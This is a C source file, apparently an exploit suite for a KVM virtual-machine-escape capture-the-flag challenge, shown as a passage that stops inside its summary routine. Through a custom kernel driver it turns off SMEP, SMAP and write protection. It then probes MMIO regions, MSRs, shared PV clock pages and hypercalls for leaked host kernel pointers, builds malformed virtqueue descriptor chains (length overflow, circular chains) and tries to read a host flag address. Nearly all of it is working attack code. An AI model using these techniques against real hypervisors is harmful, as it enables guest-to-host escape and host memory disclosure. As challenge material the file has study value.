#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <stdarg.h>
#include <ctype.h>
#include <sys/time.h>

/* IOCTL Definitions */
#define IOCTL_READ_PORT          0x1001
#define IOCTL_WRITE_PORT         0x1002
#define IOCTL_READ_MMIO          0x1003
#define IOCTL_WRITE_MMIO         0x1004
#define IOCTL_ALLOC_VQ_PAGE      0x1005
#define IOCTL_FREE_VQ_PAGE       0x1006
#define IOCTL_WRITE_VQ_DESC      0x1007
#define IOCTL_TRIGGER_HYPERCALL  0x1008
#define IOCTL_READ_KERNEL_MEM    0x1009
#define IOCTL_WRITE_KERNEL_MEM   0x100A
#define IOCTL_PATCH_INSTRUCTIONS 0x100B
#define IOCTL_READ_FLAG_ADDR     0x100C
#define IOCTL_WRITE_FLAG_ADDR    0x100D
#define IOCTL_GET_KASLR_SLIDE    0x100E
#define IOCTL_VIRT_TO_PHYS       0x100F
#define IOCTL_SCAN_VA            0x1010
#define IOCTL_WRITE_VA           0x1011
#define IOCTL_HYPERCALL_ARGS     0x1012
#define IOCTL_LOOKUP_SYMBOL      0x1013
#define IOCTL_GET_KERNEL_BASE    0x1014
#define IOCTL_DISABLE_SMEP       0x1015
#define IOCTL_DISABLE_SMAP       0x1016
#define IOCTL_DISABLE_WP         0x1017
#define IOCTL_READ_CR4           0x1018
#define IOCTL_WRITE_CR4          0x1019
#define IOCTL_READ_MSR           0x101A
#define IOCTL_WRITE_MSR          0x101B
#define IOCTL_GET_CURRENT_TASK   0x101C
#define IOCTL_ESCALATE_PRIVILEGES 0x101D
#define IOCTL_READ_PHYSICAL      0x101E
#define IOCTL_WRITE_PHYSICAL     0x101F
#define IOCTL_ALLOC_ROOT_PAGES   0x1020
#define IOCTL_ENABLE_NX          0x1021
#define IOCTL_DISABLE_NX         0x1022
#define IOCTL_READ_EFER          0x1023
#define IOCTL_WRITE_EFER         0x1024
#define IOCTL_ENABLE_SMEP        0x1025
#define IOCTL_ENABLE_SMAP        0x1026
#define IOCTL_ENABLE_WP          0x1027
#define IOCTL_READ_CR0           0x1028
#define IOCTL_WRITE_CR0          0x1029
#define IOCTL_CHECK_STATUS       0x102A

#define DEVICE_FILE "/dev/kvm_probe_dev"
#define MAX_SYMBOL_NAME 128

/* ========================================================================
 * CTF-SPECIFIC CONSTANTS
 * ======================================================================== */

/* Host flag address - THIS IS THE TARGET */
#define HOST_FLAG_ADDR 0xffffffff826279a8UL

/* Common MMIO base addresses for virtio/KVM devices */
#define VIRTIO_MMIO_BASE_1  0xfeb00000UL
#define VIRTIO_MMIO_BASE_2  0xfea00000UL
#define VIRTIO_MMIO_BASE_3  0xfe000000UL

/* PCI MMIO regions that might leak to host */
#define PCI_MMIO_START      0xe0000000UL
#define PCI_MMIO_END        0xfec00000UL

/* LAPIC/IOAPIC regions */
#define LAPIC_BASE          0xfee00000UL
#define IOAPIC_BASE         0xfec00000UL

/* Kernel direct mapping offsets */
#define KERNEL_TEXT_BASE    0xffffffff80000000UL
#define DIRECT_MAP_START    0xffff888000000000UL

/* Structures */
struct port_io_data {
    unsigned short port;
    unsigned int size;
    unsigned int value;
};

struct mmio_data {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
    unsigned long single_value;
    unsigned int value_size;
};

struct vq_desc_user_data {
    uint16_t index;
    uint64_t phys_addr;
    uint32_t len;
    uint16_t flags;
    uint16_t next_idx;
};

struct kvm_kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct kvm_kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buf;
};

struct hypercall_args {
    unsigned long nr;
    unsigned long arg0;
    unsigned long arg1;
    unsigned long arg2;
    unsigned long arg3;
};

struct patch_req {
    unsigned long dst_va;
    unsigned long size;
    unsigned char *user_buf;
};

struct symbol_lookup {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
};

struct msr_data {
    unsigned int msr;
    unsigned long long value;
};

struct physical_rw {
    unsigned long phys_addr;
    unsigned long size;
    unsigned char *user_buffer;
};

/* Global variables */
static int fd = -1;
static FILE *exploit_log = NULL;
static unsigned long g_guest_kaslr_slide = 0;
static unsigned long g_host_kaslr_slide = 0;  /* If we can leak it */
static unsigned long g_vq_pfn = 0;

/* Potential host pointer leaks */
struct host_leak {
    unsigned long addr;           /* Where we found it */
    unsigned long leaked_value;   /* The leaked pointer/value */
    char source[64];              /* How we found it */
    int confidence;               /* 1-10 */
};

static struct host_leak g_host_leaks[256];
static int g_host_leak_count = 0;

/* ========================================================================
 * UTILITY FUNCTIONS
 * ======================================================================== */

static void safe_log(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    
    if (exploit_log) {
        va_start(ap, fmt);
        vfprintf(exploit_log, fmt, ap);
        fflush(exploit_log);
        va_end(ap);
    }
}

static size_t min_size(size_t a, size_t b) {
    return a < b ? a : b;
}

/* Initialize the driver connection */
int init_driver(void) {
    fd = open(DEVICE_FILE, O_RDWR);
    if (fd < 0) {
        perror("Failed to open device");
        return -1;
    }
    
    exploit_log = fopen("exploit.log", "a");
    srand(time(NULL) ^ getpid());
    
    /* Get guest KASLR slide */
    if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &g_guest_kaslr_slide) == 0) {
        safe_log("[+] Guest KASLR slide: 0x%lx\n", g_guest_kaslr_slide);
    }
    
    /* Disable protections */
    ioctl(fd, IOCTL_DISABLE_SMEP, 0);
    ioctl(fd, IOCTL_DISABLE_SMAP, 0);
    ioctl(fd, IOCTL_DISABLE_WP, 0);
    
    safe_log("[+] Driver initialized, protections disabled\n");
    return 0;
}

/* Check if a value looks like a host kernel pointer */
static int looks_like_host_kernel_ptr(unsigned long value) {
    /* Host kernel text: 0xffffffff80000000 - 0xffffffffa0000000 */
    if (value >= 0xffffffff80000000UL && value < 0xffffffffa0000000UL) {
        return 1;
    }
    /* Host direct mapping: 0xffff888000000000 - 0xffffc88000000000 */
    if (value >= 0xffff888000000000UL && value < 0xffffc88000000000UL) {
        return 2;
    }
    /* Host module space: 0xffffffffa0000000 - 0xffffffffc0000000 */
    if (value >= 0xffffffffa0000000UL && value < 0xffffffffc0000000UL) {
        return 3;
    }
    return 0;
}

/* Record a potential host leak */
static void record_host_leak(unsigned long addr, unsigned long value, const char *source, int confidence) {
    if (g_host_leak_count >= 256) return;
    
    struct host_leak *leak = &g_host_leaks[g_host_leak_count++];
    leak->addr = addr;
    leak->leaked_value = value;
    strncpy(leak->source, source, 63);
    leak->source[63] = '\0';
    leak->confidence = confidence;
    
    int type = looks_like_host_kernel_ptr(value);
    const char *type_str = (type == 1) ? "kernel_text" : 
                          (type == 2) ? "direct_map" : 
                          (type == 3) ? "module" : "unknown";
    
    safe_log("[!] HOST LEAK #%d: addr=0x%lx value=0x%lx type=%s source=%s confidence=%d\n",
             g_host_leak_count, addr, value, type_str, source, confidence);
}

/* Display hex dump with ASCII */
static void hexdump(unsigned char *buf, unsigned long addr, size_t size) {
    for (size_t offset = 0; offset < size; offset += 16) {
        printf("0x%lx: ", addr + offset);
        
        size_t line_size = (offset + 16 <= size) ? 16 : (size - offset);
        
        for (size_t i = 0; i < 16; i++) {
            if (i < line_size) {
                printf("%02x ", buf[offset + i]);
            } else {
                printf("   ");
            }
        }
        
        printf(" | ");
        
        for (size_t i = 0; i < line_size; i++) {
            unsigned char c = buf[offset + i];
            printf("%c", isprint(c) ? c : '.');
        }
        
        printf("\n");
    }
}

/* ========================================================================
 * CORE MEMORY OPERATIONS
 * ======================================================================== */

static int read_physical(unsigned long phys_addr, unsigned char *buf, size_t size) {
    struct physical_rw req = {
        .phys_addr = phys_addr,
        .size = size,
        .user_buffer = buf
    };
    return ioctl(fd, IOCTL_READ_PHYSICAL, &req);
}

static int write_physical(unsigned long phys_addr, unsigned char *buf, size_t size) {
    struct physical_rw req = {
        .phys_addr = phys_addr,
        .size = size,
        .user_buffer = buf
    };
    return ioctl(fd, IOCTL_WRITE_PHYSICAL, &req);
}

static int read_mmio(unsigned long phys_addr, unsigned char *buf, size_t size) {
    struct mmio_data req = {
        .phys_addr = phys_addr,
        .size = size,
        .user_buffer = buf,
        .single_value = 0,
        .value_size = 0
    };
    return ioctl(fd, IOCTL_READ_MMIO, &req);
}

static int write_mmio_value(unsigned long phys_addr, unsigned long value, unsigned int size) {
    struct mmio_data req = {
        .phys_addr = phys_addr,
        .size = 0,
        .user_buffer = NULL,
        .single_value = value,
        .value_size = size
    };
    return ioctl(fd, IOCTL_WRITE_MMIO, &req);
}

static unsigned long alloc_vq_page(void) {
    unsigned long pfn = 0;
    if (ioctl(fd, IOCTL_ALLOC_VQ_PAGE, &pfn) < 0) {
        return 0;
    }
    g_vq_pfn = pfn;
    return pfn;
}

static void free_vq_page(void) {
    ioctl(fd, IOCTL_FREE_VQ_PAGE, 0);
    g_vq_pfn = 0;
}

static int write_vq_desc(uint16_t index, uint64_t phys_addr, uint32_t len, 
                         uint16_t flags, uint16_t next_idx) {
    struct vq_desc_user_data desc = {
        .index = index,
        .phys_addr = phys_addr,
        .len = len,
        .flags = flags,
        .next_idx = next_idx
    };
    return ioctl(fd, IOCTL_WRITE_VQ_DESC, &desc);
}

static long trigger_hypercall(void) {
    long ret = 0;
    ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &ret);
    return ret;
}

static long do_hypercall(unsigned long nr, unsigned long a0, unsigned long a1,
                         unsigned long a2, unsigned long a3) {
    struct hypercall_args args = {
        .nr = nr,
        .arg0 = a0,
        .arg1 = a1,
        .arg2 = a2,
        .arg3 = a3
    };
    if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0) {
        return -1;
    }
    return (long)args.nr; /* Return value is stored back */
}

/* ========================================================================
 * CTF ATTACK VECTOR 1: MMIO PROBING FOR HOST MEMORY LEAKS
 * ======================================================================== */

/*
 * Probe MMIO regions looking for host memory leaks.
 * Some KVM device emulation bugs can leak host pointers.
 */
void probe_mmio_for_host_leaks(void) {
    safe_log("\n=== MMIO HOST LEAK PROBE ===\n");
    
    /* Common MMIO regions to probe */
    struct {
        unsigned long base;
        unsigned long size;
        const char *name;
    } regions[] = {
        { 0xfeb00000, 0x1000, "virtio-mmio-0" },
        { 0xfeb01000, 0x1000, "virtio-mmio-1" },
        { 0xfeb02000, 0x1000, "virtio-mmio-2" },
        { 0xfea00000, 0x1000, "pci-mmio-low" },
        { 0xfe000000, 0x1000, "pci-mmio-base" },
        { 0xfec00000, 0x1000, "ioapic" },
        { 0xfee00000, 0x1000, "lapic" },
        { 0xfed00000, 0x1000, "hpet" },
        { 0, 0, NULL }
    };
    
    unsigned char buf[4096];
    
    for (int i = 0; regions[i].name != NULL; i++) {
        safe_log("[*] Probing %s at 0x%lx...\n", regions[i].name, regions[i].base);
        
        memset(buf, 0, sizeof(buf));
        if (read_mmio(regions[i].base, buf, regions[i].size) == 0) {
            /* Scan for host kernel pointers */
            for (size_t off = 0; off <= regions[i].size - 8; off += 8) {
                unsigned long value = *(unsigned long *)(buf + off);
                if (looks_like_host_kernel_ptr(value)) {
                    char source[64];
                    snprintf(source, sizeof(source), "%s+0x%lx", regions[i].name, off);
                    record_host_leak(regions[i].base + off, value, source, 5);
                }
            }
        } else {
            safe_log("[-] Failed to read %s\n", regions[i].name);
        }
    }
}

/* ========================================================================
 * CTF ATTACK VECTOR 2: VIRTQUEUE DMA CONFUSION
 * ======================================================================== */

/*
 * Attempt to confuse virtqueue processing to access host memory.
 * The idea is to set up descriptors pointing to host physical addresses.
 */
void virtqueue_host_memory_attack(unsigned long target_host_addr) {
    safe_log("\n=== VIRTQUEUE HOST MEMORY ATTACK ===\n");
    safe_log("[*] Target host address: 0x%lx\n", target_host_addr);
    
    /* Allocate VQ page */
    unsigned long pfn = alloc_vq_page();
    if (!pfn) {
        safe_log("[-] Failed to allocate VQ page\n");
        return;
    }
    safe_log("[+] VQ page PFN: 0x%lx (phys: 0x%lx)\n", pfn, pfn << 12);
    
    /* Allocate pages for reading results */
    unsigned long phys_pages[8] = {0};
    if (ioctl(fd, IOCTL_ALLOC_ROOT_PAGES, phys_pages) != 0) {
        safe_log("[-] Failed to allocate result pages\n");
        free_vq_page();
        return;
    }
    
    safe_log("[+] Result pages allocated:\n");
    for (int i = 0; i < 8 && phys_pages[i]; i++) {
        safe_log("    [%d] 0x%lx\n", i, phys_pages[i]);
    }
    
    /*
     * Strategy: Create a descriptor chain that might confuse KVM's
     * virtqueue processing into accessing host memory.
     * 
     * We try various address transformations that might bypass
     * guest physical address validation.
     */
    
    /* Attempt 1: Direct host address (unlikely to work but try) */
    safe_log("[*] Attempt 1: Direct host address in descriptor\n");
    write_vq_desc(0, target_host_addr, 64, 0, 1);
    write_vq_desc(1, phys_pages[0], 64, 0, 0);
    trigger_hypercall();
    
    /* Check if anything was written to our result page */
    unsigned char result[256];
    if (read_physical(phys_pages[0], result, sizeof(result)) == 0) {
        int nonzero = 0;
        for (int i = 0; i < 256; i++) {
            if (result[i]) nonzero++;
        }
        if (nonzero > 0) {
            safe_log("[!] Result page has %d non-zero bytes!\n", nonzero);
            hexdump(result, phys_pages[0], 256);
        }
    }
    
    /* Attempt 2: Use large length to overflow bounds checks */
    safe_log("[*] Attempt 2: Length overflow attack\n");
    write_vq_desc(0, 0x1000, 0xffffffff, 1, 1);  /* VRING_DESC_F_NEXT */
    write_vq_desc(1, phys_pages[1], 4096, 0, 0);
    trigger_hypercall();
    
    /* Attempt 3: Circular descriptor chain */
    safe_log("[*] Attempt 3: Circular chain confusion\n");
    write_vq_desc(0, 0x1000, 0x1000, 1, 1);
    write_vq_desc(1, 0x2000, 0x1000, 1, 2);
    write_vq_desc(2, 0x3000, 0x1000, 1, 0);  /* Points back to 0 */
    trigger_hypercall();
    
    /* Attempt 4: Physical address near RAM boundary */
    safe_log("[*] Attempt 4: RAM boundary addresses\n");
    /* Guest RAM typically ends somewhere, try addresses past it */
    unsigned long test_addrs[] = {
        0x100000000UL,     /* 4GB */
        0x200000000UL,     /* 8GB */
        0x80000000UL,      /* 2GB */
        0x40000000UL,      /* 1GB */
        0x3fff0000UL,      /* Just under 1GB */
        0
    };
    
    for (int i = 0; test_addrs[i]; i++) {
        write_vq_desc(0, test_addrs[i], 4096, 1, 1);
        write_vq_desc(1, phys_pages[2], 4096, 0, 0);
        trigger_hypercall();
        
        if (read_physical(phys_pages[2], result, 256) == 0) {
            int nonzero = 0;
            for (int j = 0; j < 256; j++) {
                if (result[j]) nonzero++;
            }
            if (nonzero > 10) {
                safe_log("[!] Interesting data from addr 0x%lx!\n", test_addrs[i]);
                hexdump(result, phys_pages[2], 256);
            }
        }
        memset(result, 0, sizeof(result));
        write_physical(phys_pages[2], result, 256);
    }
    
    free_vq_page();
    safe_log("[*] VQ attack sequence complete\n");
}

/* ========================================================================
 * CTF ATTACK VECTOR 3: HYPERCALL EXPLOITATION
 * ======================================================================== */

/*
 * Try various hypercalls that might leak or access host memory.
 * KVM has had bugs where hypercalls could leak host pointers.
 */
void hypercall_exploitation(unsigned long target_addr) {
    safe_log("\n=== HYPERCALL EXPLOITATION ===\n");
    
    /* Standard KVM hypercall numbers */
    unsigned long hcalls[] = {
        0,                  /* KVM_HC_VAPIC_POLL_IRQ */
        1,                  /* KVM_HC_MMU_OP (deprecated) */
        2,                  /* KVM_HC_FEATURES */
        3,                  /* KVM_HC_PPC_MAP_MAGIC_PAGE */
        4,                  /* KVM_HC_KICK_CPU */
        5,                  /* KVM_HC_MIPS_GET_CLOCK_FREQ */
        6,                  /* KVM_HC_MIPS_EXIT_VM */
        7,                  /* KVM_HC_MIPS_CONSOLE_OUTPUT */
        8,                  /* KVM_HC_CLOCK_PAIRING */
        9,                  /* KVM_HC_SEND_IPI */
        10,                 /* KVM_HC_SCHED_YIELD */
        11,                 /* KVM_HC_MAP_GPA_RANGE */
        /* Extended/experimental hypercalls */
        100, 101, 102, 103, 104, 105,
        0x80000000,         /* Potential vendor hypercalls */
        0x80000001,
        0xffffffff,
    };
    
    for (size_t i = 0; i < sizeof(hcalls)/sizeof(hcalls[0]); i++) {
        long ret;
        
        /* Try hypercall with target address as argument */
        ret = do_hypercall(hcalls[i], target_addr, 0, 0, 0);
        if (ret != 0 && ret != -1 && ret != -1000) {
            safe_log("[!] Hypercall %lu with target addr returned: %ld (0x%lx)\n",
                     hcalls[i], ret, (unsigned long)ret);
            
            if (looks_like_host_kernel_ptr((unsigned long)ret)) {
                record_host_leak(0, (unsigned long)ret, "hypercall_return", 7);
            }
        }
        
        /* Try with address as different arguments */
        ret = do_hypercall(hcalls[i], 0, target_addr, 0, 0);
        ret = do_hypercall(hcalls[i], 0, 0, target_addr, 0);
        ret = do_hypercall(hcalls[i], 0, 0, 0, target_addr);
        
        /* Try with small values that might index into host structures */
        for (int j = 0; j < 256; j += 16) {
            ret = do_hypercall(hcalls[i], j, 0, 0, 0);
            if (looks_like_host_kernel_ptr((unsigned long)ret)) {
                safe_log("[!] Hypercall %lu(%d) leaked: 0x%lx\n", 
                         hcalls[i], j, (unsigned long)ret);
                record_host_leak(0, (unsigned long)ret, "hypercall_indexed", 6);
            }
        }
    }
}

/* ========================================================================
 * CTF ATTACK VECTOR 4: MSR-BASED ATTACKS
 * ======================================================================== */

/*
 * Some MSRs in KVM can leak host information or provide
 * access to host memory mappings.
 */
void msr_exploitation(void) {
    safe_log("\n=== MSR EXPLOITATION ===\n");
    
    struct msr_data msr_req;
    
    /* Interesting MSRs that might leak host info */
    unsigned int msrs[] = {
        0x00000017,  /* IA32_PLATFORM_ID */
        0x0000001b,  /* IA32_APIC_BASE */
        0x0000003a,  /* IA32_FEATURE_CONTROL */
        0x00000174,  /* IA32_SYSENTER_CS */
        0x00000175,  /* IA32_SYSENTER_ESP */
        0x00000176,  /* IA32_SYSENTER_EIP */
        0x00000277,  /* IA32_PAT */
        0xc0000080,  /* MSR_EFER */
        0xc0000081,  /* MSR_STAR */
        0xc0000082,  /* MSR_LSTAR */
        0xc0000083,  /* MSR_CSTAR */
        0xc0000084,  /* MSR_SYSCALL_MASK */
        0xc0000100,  /* MSR_FS_BASE */
        0xc0000101,  /* MSR_GS_BASE */
        0xc0000102,  /* MSR_KERNEL_GS_BASE */
        0xc0000103,  /* MSR_TSC_AUX */
        /* KVM-specific MSRs */
        0x4b564d00,  /* MSR_KVM_WALL_CLOCK */
        0x4b564d01,  /* MSR_KVM_SYSTEM_TIME */
        0x4b564d02,  /* MSR_KVM_WALL_CLOCK_NEW */
        0x4b564d03,  /* MSR_KVM_SYSTEM_TIME_NEW */
        0x4b564d04,  /* MSR_KVM_ASYNC_PF_EN */
        0x4b564d05,  /* MSR_KVM_STEAL_TIME */
        0x4b564d06,  /* MSR_KVM_PV_EOI_EN */
        0x4b564d07,  /* MSR_KVM_POLL_CONTROL */
        0x4b564d10,  /* MSR_KVM_ASYNC_PF_INT */
        0x4b564d11,  /* MSR_KVM_ASYNC_PF_ACK */
        0
    };
    
    for (int i = 0; msrs[i]; i++) {
        msr_req.msr = msrs[i];
        msr_req.value = 0;
        
        if (ioctl(fd, IOCTL_READ_MSR, &msr_req) == 0) {
            safe_log("[*] MSR 0x%08x = 0x%016llx\n", msrs[i], msr_req.value);
            
            if (looks_like_host_kernel_ptr(msr_req.value)) {
                char source[32];
                snprintf(source, sizeof(source), "msr_0x%x", msrs[i]);
                record_host_leak(0, msr_req.value, source, 4);
            }
        }
    }
}

/* ========================================================================
 * CTF ATTACK VECTOR 5: SHARED MEMORY/COVERT CHANNEL
 * ======================================================================== */

/*
 * Look for shared memory regions that might leak between host and guest.
 * Also check PV clock and steal time structures.
 */
void shared_memory_scan(void) {
    safe_log("\n=== SHARED MEMORY SCAN ===\n");
    
    unsigned char buf[4096];
    
    /* KVM PV clock shared page */
    struct msr_data msr_req;
    msr_req.msr = 0x4b564d03;  /* MSR_KVM_SYSTEM_TIME_NEW */
    msr_req.value = 0;
    
    if (ioctl(fd, IOCTL_READ_MSR, &msr_req) == 0 && msr_req.value) {
        unsigned long pv_clock_addr = msr_req.value & ~1UL;
        safe_log("[*] PV clock at physical 0x%llx\n", (unsigned long long)pv_clock_addr);
        
        if (read_physical(pv_clock_addr, buf, 4096) == 0) {
            safe_log("[+] PV clock page contents:\n");
            hexdump(buf, pv_clock_addr, 64);
            
            /* Scan for pointers */
            for (size_t off = 0; off <= 4096 - 8; off += 8) {
                unsigned long value = *(unsigned long *)(buf + off);
                if (looks_like_host_kernel_ptr(value)) {
                    record_host_leak(pv_clock_addr + off, value, "pv_clock", 5);
                }
            }
        }
    }
    
    /* KVM steal time */
    msr_req.msr = 0x4b564d05;  /* MSR_KVM_STEAL_TIME */
    if (ioctl(fd, IOCTL_READ_MSR, &msr_req) == 0 && msr_req.value) {
        unsigned long steal_time_addr = msr_req.value & ~1UL;
        safe_log("[*] Steal time at physical 0x%llx\n", (unsigned long long)steal_time_addr);
        
        if (read_physical(steal_time_addr, buf, 4096) == 0) {
            hexdump(buf, steal_time_addr, 64);
            
            for (size_t off = 0; off <= 4096 - 8; off += 8) {
                unsigned long value = *(unsigned long *)(buf + off);
                if (looks_like_host_kernel_ptr(value)) {
                    record_host_leak(steal_time_addr + off, value, "steal_time", 5);
                }
            }
        }
    }
}

/* ========================================================================
 * CTF ATTACK VECTOR 6: PHYSICAL MEMORY SCANNING
 * ======================================================================== */

/*
 * Scan physical memory for patterns that might indicate host memory leaks.
 * Guest physical memory shouldn't contain host kernel pointers.
 */
void scan_physical_for_host_ptrs(unsigned long start, unsigned long end, unsigned long step) {
    safe_log("\n=== PHYSICAL MEMORY SCAN FOR HOST POINTERS ===\n");
    safe_log("[*] Scanning 0x%lx - 0x%lx (step 0x%lx)\n", start, end, step);
    
    unsigned char buf[4096];
    unsigned long addr = start;
    int found = 0;
    
    while (addr < end) {
        if (read_physical(addr, buf, 4096) == 0) {
            for (size_t off = 0; off <= 4096 - 8; off += 8) {
                unsigned long value = *(unsigned long *)(buf + off);
                if (looks_like_host_kernel_ptr(value)) {
                    char source[64];
                    snprintf(source, sizeof(source), "phys_scan@0x%lx", addr + off);
                    record_host_leak(addr + off, value, source, 3);
                    found++;
                    
                    if (found <= 10) {
                        safe_log("[!] Found at 0x%lx: 0x%lx\n", addr + off, value);
                        /* Show context */
                        size_t ctx_start = (off >= 32) ? off - 32 : 0;
                        hexdump(buf + ctx_start, addr + ctx_start, 64);
                    }
                }
            }
        }
        
        addr += step;
        
        if ((addr - start) % 0x1000000 == 0) {
            safe_log("[.] Progress: 0x%lx / 0x%lx\n", addr, end);
        }
    }
    
    safe_log("[*] Scan complete. Found %d potential host pointers.\n", found);
}

/* ========================================================================
 * CTF ATTACK VECTOR 7: FLAG-SPECIFIC ATTACK
 * ======================================================================== */

/*
 * Specifically target the flag at 0xffffffff826279a8.
 * This tries various techniques to read from that exact address.
 */
void attack_flag_address(unsigned long flag_addr) {
    safe_log("\n=== TARGETED FLAG ATTACK ===\n");
    safe_log("[*] Target: 0x%lx\n", flag_addr);
    
    unsigned char result[256];
    memset(result, 0, sizeof(result));
    
    /* First, check if we've found any host leaks that could help */
    if (g_host_leak_count > 0) {
        safe_log("[+] Analyzing %d host leaks for useful information...\n", g_host_leak_count);
        
        for (int i = 0; i < g_host_leak_count; i++) {
            struct host_leak *leak = &g_host_leaks[i];
            
            /* Check if leak is near our target */
            long offset = (long)(flag_addr - leak->leaked_value);
            if (offset > -0x10000 && offset < 0x10000) {
                safe_log("[!] Leak #%d is %ld bytes from target!\n", i, offset);
                safe_log("    Leak addr: 0x%lx, value: 0x%lx\n", 
                         leak->addr, leak->leaked_value);
            }
            
            /* Check if this looks like a base address we could use */
            if ((leak->leaked_value & 0xfffff) == 0) {
                safe_log("[*] Leak #%d looks like an aligned base: 0x%lx\n",
                         i, leak->leaked_value);
            }
        }
    }
    
    /* Try using the write_flag IOCTL if the driver supports CTF mode */
    unsigned long val = 0;
    if (ioctl(fd, IOCTL_READ_FLAG_ADDR, &val) == 0 && val != 0) {
        safe_log("[!] READ_FLAG_ADDR returned: 0x%lx\n", val);
        
        /* Try to read as string */
        if (val > 0x1000) {
            struct kvm_kernel_mem_read req = {
                .kernel_addr = val,
                .length = 64,
                .user_buf = result
            };
            if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
                safe_log("[+] Content at flag address:\n");
                hexdump(result, val, 64);
                
                /* Check for flag format */
                if (memcmp(result, "flag{", 5) == 0 || 
                    memcmp(result, "CTF{", 4) == 0 ||
                    memcmp(result, "KVMCTF{", 7) == 0) {
                    safe_log("\n[!!!] FLAG FOUND: %s\n", result);
                }
            }
        }
    }
    
    /* Try various memory read techniques */
    safe_log("[*] Trying direct kernel memory read...\n");
    struct kvm_kernel_mem_read kmem_req = {
        .kernel_addr = flag_addr,
        .length = 64,
        .user_buf = result
    };
    if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &kmem_req) == 0) {
        safe_log("[+] Direct read succeeded:\n");
        hexdump(result, flag_addr, 64);
    } else {
        safe_log("[-] Direct kernel read failed (expected for host address)\n");
    }
    
    /* Calculate possible physical address assuming linear mapping */
    /* Host kernel text at 0xffffffff80000000 maps physical at some offset */
    safe_log("[*] Trying physical address transformations...\n");
    
    /* Common host physical memory locations for kernel text */
    unsigned long phys_candidates[] = {
        flag_addr - 0xffffffff80000000UL,          /* Direct offset */
        flag_addr - 0xffffffff80000000UL + 0x1000000,  /* +16MB */
        (flag_addr & 0x0FFFFFFFUL),                /* Low bits only */
        (flag_addr & 0x00FFFFFFUL),                /* 24-bit offset */
        0
    };
    
    for (int i = 0; phys_candidates[i] || i == 0; i++) {
        if (phys_candidates[i] > 0x200000000UL) continue;  /* Skip ridiculous values */
        
        memset(result, 0, sizeof(result));
        if (read_physical(phys_candidates[i], result, 64) == 0) {
            int interesting = 0;
            for (int j = 0; j < 64; j++) {
                if (isprint(result[j])) interesting++;
            }
            
            if (interesting > 10) {
                safe_log("[?] Physical 0x%lx has printable content:\n", phys_candidates[i]);
                hexdump(result, phys_candidates[i], 64);
            }
        }
    }
}

/* ========================================================================
 * CTF MAIN EXPLOIT RUNNER
 * ======================================================================== */

void run_ctf_exploit(void) {
    safe_log("\n");
    safe_log("╔══════════════════════════════════════════════════════════════════╗\n");
    safe_log("║              KVMCTF VM ESCAPE EXPLOIT SUITE                      ║\n");
    safe_log("║              Target: 0x%016lx                   ║\n", HOST_FLAG_ADDR);
    safe_log("╚══════════════════════════════════════════════════════════════════╝\n");
    safe_log("\n");
    
    /* Phase 1: Information Gathering */
    safe_log("[PHASE 1] Information Gathering\n");
    safe_log("═══════════════════════════════\n");
    
    /* Get guest kernel info */
    unsigned long kernel_base = 0;
    if (ioctl(fd, IOCTL_GET_KERNEL_BASE, &kernel_base) == 0) {
        safe_log("[+] Guest kernel base: 0x%lx\n", kernel_base);
    }
    
    unsigned long current_task = 0;
    if (ioctl(fd, IOCTL_GET_CURRENT_TASK, &current_task) == 0) {
        safe_log("[+] Current task_struct: 0x%lx\n", current_task);
    }
    
    /* Read control registers */
    unsigned long cr0 = 0, cr4 = 0;
    unsigned long long efer = 0;
    ioctl(fd, IOCTL_READ_CR0, &cr0);
    ioctl(fd, IOCTL_READ_CR4, &cr4);
    ioctl(fd, IOCTL_READ_EFER, &efer);
    safe_log("[+] CR0=0x%lx CR4=0x%lx EFER=0x%llx\n", cr0, cr4, efer);
    
    /* Phase 2: MSR Exploitation */
    safe_log("\n[PHASE 2] MSR Exploitation\n");
    safe_log("═══════════════════════════\n");
    msr_exploitation();
    
    /* Phase 3: MMIO Probing */
    safe_log("\n[PHASE 3] MMIO Probing\n");
    safe_log("═══════════════════════\n");
    probe_mmio_for_host_leaks();
    
    /* Phase 4: Shared Memory Analysis */
    safe_log("\n[PHASE 4] Shared Memory Analysis\n");
    safe_log("══════════════════════════════════\n");
    shared_memory_scan();
    
    /* Phase 5: Hypercall Exploitation */
    safe_log("\n[PHASE 5] Hypercall Exploitation\n");
    safe_log("══════════════════════════════════\n");
    hypercall_exploitation(HOST_FLAG_ADDR);
    
    /* Phase 6: Virtqueue Attack */
    safe_log("\n[PHASE 6] Virtqueue DMA Attack\n");
    safe_log("════════════════════════════════\n");
    virtqueue_host_memory_attack(HOST_FLAG_ADDR);
    
    /* Phase 7: Physical Memory Scan */
    safe_log("\n[PHASE 7] Physical Memory Scan\n");
    safe_log("════════════════════════════════\n");
    scan_physical_for_host_ptrs(0x0, 0x10000000, 0x10000);  /* First 256MB */
    
    /* Phase 8: Targeted Attack */
    safe_log("\n[PHASE 8] Targeted Flag Attack\n");
    safe_log("════════════════════════════════\n");
    attack_flag_address(HOST_FLAG_ADDR);
    
    /* Summary */
    safe_log("\n");
    safe_log("╔══════════════════════════════════════════════════════════════════╗\n");
    safe_log("║                        EXPLOIT SUMMARY                           ║\n");
    safe_log("╚══════════════════════════════════════════════════════════════════╝\n");
    safe_log("\n");
    safe_log("[*] Total host leaks found: %d\n", g_host_leak_count);
    
    if (g_host_leak_count > 0) {
        safe_log("\n[*] Top leaks by confidence:\n");
        
        /* Sort by confidence (simple bubble sort) */
        for (int i = 0; i < g_host_leak_count - 1; i++) {
            for (int j = 0; j < g_host_leak_count - i - 1; j++) {
                if (g_host_leaks[j].confidence < g_host_leaks[j+1].confidence) {
                    struct host_leak tmp = g_host_leaks[j];
                    g_host_leaks[j] = g_host_leaks[j+1];
                    g_host_leaks[j+1] = tmp;
                }
            }
        }
        
        for (int i = 0; i < g_host_leak_count && i < 10; i++) {
